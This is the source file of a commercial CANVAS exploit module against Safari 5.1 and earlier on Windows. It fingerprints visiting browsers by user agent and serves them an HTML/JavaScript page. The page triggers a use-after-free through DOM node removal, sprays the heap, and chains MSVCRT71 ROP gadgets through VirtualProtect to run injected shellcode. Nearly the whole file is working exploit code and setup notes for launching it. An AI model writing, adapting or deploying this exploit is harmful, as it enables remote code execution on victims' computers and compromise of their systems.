#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2011
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import hashlib
import random

from exploitutils import *
from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from libs.ua_parser import user_agent_parser

NAME                           = "Safari renderdestroy"
DESCRIPTION                    = "Client-Side vulnerability in Safari <= 5.1 (7534.50)"
DOCUMENTATION                  = {}
DOCUMENTATION["Repeatability"] = "Infinite"
VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Client Side"
PROPERTY['ARCH']               = [ ["Windows"] ]
PROPERTY['VERSION']            = [ "XP", "Vista", "7" ]
PROPERTY["CVE"]                = "Not yet"

NOTES="""
Run from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.21 -d 5555 -O server_port:8080 -O allowed_attack_modules:safari_renderdestroy -O auto_detect_exploits:0

ROP strategy:

    * MSVCRT71 dependant only, this will need java installed but will bypass ASLR on Windows 7.
        - Use 2 gadgets to stack pivot with mem(ESI):

7C35A379  |> 8B46 0C        /MOV EAX,DWORD PTR DS:[ESI+C]
7C35A37C  |. 8B00           |MOV EAX,DWORD PTR DS:[EAX]
7C35A37E  |. FF76 0C        |PUSH DWORD PTR DS:[ESI+C]
7C35A381  |. 8946 08        |MOV DWORD PTR DS:[ESI+8],EAX
7C35A384  |. FF56 04        |CALL DWORD PTR DS:[ESI+4]

7C348B05   94               XCHG EAX,ESP
7C348B06   C3               RETN

        - VirtualProtect ROP
        - Shellcode
"""

CHANGELOG="""

"""

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("AppleWebKit", "Safari", "")]
        self.plugin_info = None # we want clientd to give us a plugin dict
        self.supports_dns_mosdef = False
        self.shellcode="\xcc" * 298
        self.setVersions()
        self.version=1
        self.badstring="" #bad strings are for wusses :>
        self.name=NAME 
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")


    def random_dummy_string(self, prefix=""):
        h = hashlib.new('sha1')
        h.update(str(random.random() * 10).replace('.', ''))
        retval = h.hexdigest()
        retval = '%s%.5s' % (prefix, retval)
        return retval
    
    # This is expecting an info_dict that is populated like so:
    #
    # info_dict['plugins'] = parse_plugin_data(plugins_dict)
    # info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
    #
    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    
    def is_vulnerable(self, info_dict):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if 'Windows' not in parsed['os']['family']: return 0
        if 'Safari' in parsed['user_agent']['family']:
            
            try:
                minor = int(parsed['user_agent']['minor'])
            except Exception:
                return 0
                           

            if parsed['user_agent']['major'] == '5' and \
               minor <= 1:
                return 100

        return 0
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
    
    def shellcodetodwordlist(self, shellcode):
        # align
        shellcode = shellcode + "\xcc"*(4 - (len(shellcode) % 4))
        #convert
        import struct
        dwordlist = [ struct.unpack("<L",shellcode[i:i+4])[0] for i in range(0,len(shellcode),4)]
        hexlist = ",".join(map(hex,dwordlist))
        return hexlist

    def makefile(self):
        replaces={}
        replaces["SHELLCODE"]=self.shellcodetodwordlist(self.shellcode)
        
        filedata="""
<!DOCTYPE html>
<html>
<body>
<applet code="ropplet.class" width="100" height="100" name="ropplet"></applet>
<div id="console"></div>
<style>
div { -webkit-column-count: 1; }
h2 { -webkit-column-span: all; }
</style>
<script type="application/javascript">
        """
        
        js="""
var shellc0de = [ SHELLCODE ];
var tarr = new Array();

            //kudos to Agustin for the technique (HTML5 TM)
            function create_block2(base, q){
                var quant = (q/2)-0x10;

		var arr = new ArrayBuffer(q);
		var block = new Uint32Array(arr);

		var i = 0;
		for(;i < (0x20)/4;i++){
                    block[i]= base+0x1000;
                }
		block[i] = 0;
		i++;
		for(;i < (0x4c)/4;i++){
                    block[i]= base+0x1000;
                }
		block[i]= 0;
		i++;
		for(;i < 0x7c/4;i++){
			block[i]=base+0x1100;
		}
		block[i]=0x7C35A379; //stack pivot
		i++;
		for(;i < (0xf0)/4;i++){
			block[i]=base+0x1100;
		}
		block[i]=base;i++;
		for(;i < (0x5d8+4)/4;i++){
			block[i]=base+0x40;
		}
		for(;i < (0x1000)/4;i++){
			block[i]=base+0x100;
		}
		//+0x384 offset in vtable
		block[i]= base+0x1100-0x384;
		i++;
		for(;i < (0x1100)/4;i++){
			block[i]= base+0x100;
		}
		block[i]= base+0x1104; //new stack
		i++;
		block[i]= 0x7C344CC1; i++;  //pop eax;ret
		block[i]= 0x7C37A140; i++;  //VirtualProtect address
		block[i]= 0x7C3530EA; i++;  //mov eax,[eax];ret
		block[i]= 0x7C341FE4; i++;  //call eax;ret
		block[i]= base;       i++;  //Address
		block[i]= 0x4000;     i++;  //Length
		block[i]= 0x40;       i++;  //Prot
		block[i]= base;       i++;  //OldProt
		block[i]= base+0x1128;i++;  //ret

		//here we can start with shellcode
		for(j = 0; j < shellc0de.length; j++){
			block[i] = shellc0de[j];
			i++;
		}

                return arr;
            }

            function spray_block2(block, quant){
                var t = new Array(quant);
 		for(var i=0; i< quant; i++){
			var arr = new ArrayBuffer(block.byteLength);
			var b = new Uint32Array(block);
			var c = new Uint32Array(arr);
			//copy array
			for(var j=0; j < block.byteLength/4; j++){
				c[j] = b[j];
			}
             	        t.push(arr);
		}
                return t;
            }

function create_object(base, size){
	var arr = new ArrayBuffer(size);
	var b32 = new Uint32Array(arr);
	b32[0] = base;       //0x0
	b32[1] = 0x7C348B05; //0x4 //xchg eax,esp;ret
	b32[2] = base;       //0x8
	b32[3] = base+0x1100;//0xc //new stack
	for(var i=4; i < size/4; i++){
	  b32[i] = base;
	}
	return arr;
}


function run3xploit()
{
    document.body.offsetTop;
    child = document.getElementById('test');
    child.parentNode.removeChild(child);
    child = 0;

    //trigger gc
    for(var i=0;i < 0x10000; i++){
        var t = String.fromCharCode(i);
    }

    //var base = 0x7f930000;
    var base = 0x7ec00000;
    obj = create_object(base, 0x40);
    var objreplace = spray_block2(obj,0x100);

    //create spray
    spray = create_block2(base, 0x2000);
    var t = spray_block2(spray,0xc000);

    document.body.innerHTML += "IMM";

}

setTimeout("run3xploit()", 1000);
"""
        for k,v in replaces.iteritems():
            js=js.replace(k,v)
        
        #filedata+=self.jsObfuscator.obfuscate(js)
        filedata+=js
        
        filedata+="""
</script>
<div>
<span id="test"><h2></span>
</div>
</body>
</html>
        """        
        return filedata
    
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        self.log("Request: "+clientheader.URL)
        if clientheader.URL.count(self.filename):
            #the exploit
            self.log("sending HTML")
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
            h.addHeader("Content-Type","text/html")
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
            h.addHeader("Content-Type","text/html")

        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
